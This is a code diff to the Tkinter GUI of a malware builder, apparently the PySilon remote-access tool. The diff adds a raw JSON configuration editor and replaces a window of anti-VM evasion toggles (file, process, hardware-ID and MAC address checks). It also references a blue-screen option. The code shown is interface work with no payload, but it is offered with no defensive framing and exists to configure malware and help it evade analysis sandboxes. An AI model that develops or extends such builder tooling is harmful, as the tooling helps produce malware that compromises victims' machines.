@@ -210,7 +210,7 @@ class Builder:
         print(self.malware_configuration)
 
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
-            configuration_file.write(json.dumps(self.malware_configuration))
+            configuration_file.write(json.dumps(self.malware_configuration, indent=4))
 
         if close != False:
             close.destroy()
@@ -218,7 +218,48 @@ class Builder:
     def load_configuration(self, temporary):
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'r', encoding='utf-8') as configuration_file:
             self.malware_configuration = json.loads(''.join(configuration_file.readlines()))
-        
+    
+    def write_configuration(self):
+        with open('resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
+            configuration_file.write(self.text.get('1.0', tk.END))
+        self.malware_configuration = json.loads(self.text.get('1.0', tk.END))
+
+    def configuration_editor(self, file):
+        cfg_editor = tk.Tk()
+        cfg_editor.geometry('400x500')
+        cfg_editor.title('Configuration Editor')
+
+        frame = tk.Frame(cfg_editor)
+        frame.place(x=0, y=0, width=400, height=500)
+
+        self.text = tk.Text(frame)
+        self.text.place(x=0, y=0, width=400, height=475)
+
+        with open(file, 'r', encoding='utf-8') as configuration_file:
+            self.text.insert('1.0', ''.join(configuration_file.readlines()))
+
+        self.text.tag_add('highlight', '34.0', '38.0')
+        self.text.tag_configure('highlight', background='#9effb8', foreground='black')
+        self.text.see(tk.END)
+
+        btn_savecfg = tk.Button(
+            frame,
+            text='Save',
+            font=tkFont.Font(family='Consolas', size=5),
+            disabledforeground='white',
+            command=self.write_configuration
+        )
+        btn_savecfg.place(x=399, y=499, anchor=tk.SE)
+
+        cfg_editor.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
+        cfg_editor.mainloop()
+
+    def double_click_settings(self, context):
+        if time.time() - self.time_check < 0.5:
+            if context == 'antivm':
+                self.configuration_editor('resources/assets/configuration.tmp')
+        self.time_check = time.time()
+
     def open_pysilon(self):
         os.system('start https://pysilon.net')
 
@@ -648,93 +689,6 @@ class Builder:
         self.cbvar_bluesod.set(self.malware_configuration['functionalities']['bluesod'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*9, window=self.cb_bluesod, anchor='w')
 
-    def advanced_settings_window(self, context):
-        if time.time() - self.time_check < 0.5:
-            self.advanced_settings = tk.Tk()
-            if context == 'antivm':
-                self.advanced_settings.geometry('300x200')
-                self.advanced_settings.title('Advanced Settings (Anti-VM)')
-
-                self.advanced_canvas = tk.Canvas(self.advanced_settings, border=0, highlightthickness=0)
-                self.advanced_canvas.place(x=0,y=0,width=300,height=200)
-
-                self.cbvar_filecheck = tk.BooleanVar(value=True)
-                self.cb_filecheck = tk.Checkbutton(
-                    self.advanced_canvas,
-                    selectcolor='#0A0A10',
-                    text='FilesCheck',
-                    font=('Consolas', 12),
-                    variable=self.cbvar_filecheck,
-                    onvalue=True,
-                    offvalue=False
-                )
-                self.cb_filecheck.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['advanced_antivm']['FilesCheck']))
-                self.cb_filecheck.bind("<Leave>", self.hide_tooltip)
-                self.cbvar_filecheck.set(self.malware_configuration['anti_vm']['FilesCheck'])
-                self.advanced_canvas.create_window(25, 25, window=self.cb_filecheck, anchor=tk.NW)
-
-                self.cbvar_processcheck = tk.BooleanVar(value=True)
-                self.cb_processcheck = tk.Checkbutton(
-                    self.advanced_canvas,
-                    selectcolor='#0A0A10',
-                    text='ProcessesCheck',
-                    font=('Consolas', 12),
-                    variable=self.cbvar_processcheck,
-                    onvalue=True,
-                    offvalue=False
-                )
-                self.cb_processcheck.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['advanced_antivm']['ProcessesCheck']))
-                self.cb_processcheck.bind("<Leave>", self.hide_tooltip)
-                self.cbvar_processcheck.set(self.malware_configuration['anti_vm']['ProcessesCheck'])
-                self.advanced_canvas.create_window(25, 55, window=self.cb_processcheck, anchor=tk.NW)
-
-                self.cbvar_hwidcheck = tk.BooleanVar(value=True)
-                self.cb_hwidcheck = tk.Checkbutton(
-                    self.advanced_canvas,
-                    selectcolor='#0A0A10',
-                    text='HardwareIDsCheck',
-                    font=('Consolas', 12),
-                    variable=self.cbvar_hwidcheck,
-                    onvalue=True,
-                    offvalue=False
-                )
-                self.cb_hwidcheck.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['advanced_antivm']['HardwareIDsCheck']))
-                self.cb_hwidcheck.bind("<Leave>", self.hide_tooltip)
-                self.cbvar_hwidcheck.set(self.malware_configuration['anti_vm']['HardwareIDsCheck'])
-                self.advanced_canvas.create_window(25, 85, window=self.cb_hwidcheck, anchor=tk.NW)
-
-                self.cbvar_maccheck = tk.BooleanVar(value=True)
-                self.cb_maccheck = tk.Checkbutton(
-                    self.advanced_canvas,
-                    selectcolor='#0A0A10',
-                    text='MacAddressesCheck',
-                    font=('Consolas', 12),
-                    variable=self.cbvar_maccheck,
-                    onvalue=True,
-                    offvalue=False
-                )
-                self.cb_maccheck.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['advanced_antivm']['MacAddressesCheck']))
-                self.cb_maccheck.bind("<Leave>", self.hide_tooltip)
-                self.cbvar_maccheck.set(True)
-                self.advanced_canvas.create_window(25, 115, window=self.cb_maccheck, anchor=tk.NW)
-
-                btn_saveadv = tk.Button(
-                    self.advanced_canvas,
-                    text='Save',
-                    font=('Consolas', 10),
-                    command=lambda: self.save_configuration(True, self.advanced_settings)
-                    )
-                self.advanced_canvas.create_window(290, 190, window=btn_saveadv, anchor=tk.SE)
-
-
-            self.advanced_settings.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
-            self.advanced_settings.mainloop()
-
-
-        self.time_check = time.time()
-        print('asd')
-
-
     def compiling_settings(self):
         self.general_settings_button['state'] = tk.NORMAL
         self.general_settings_button['relief'] = 'groove'
@@ -743,7 +697,6 @@ class Builder:
         self.compiling_settings_button['state'] = tk.DISABLED
         self.compiling_settings_button['relief'] = 'flat'
         self.new_background(3)
-        #self.canvas.create_text(200, 150, text='Content for Button 3', font=('Helvetica', 16), fill='red')
 
         self.time_check = time.time()
         
@@ -768,7 +721,7 @@ class Builder:
             text='anti-VM',
             font=('Consolas', 14),
             variable=self.cbvar_antivm,
-            command=lambda: self.advanced_settings_window('antivm'),
+            command=lambda:self.double_click_settings('antivm'),
             onvalue=True,
             offvalue=False
         )
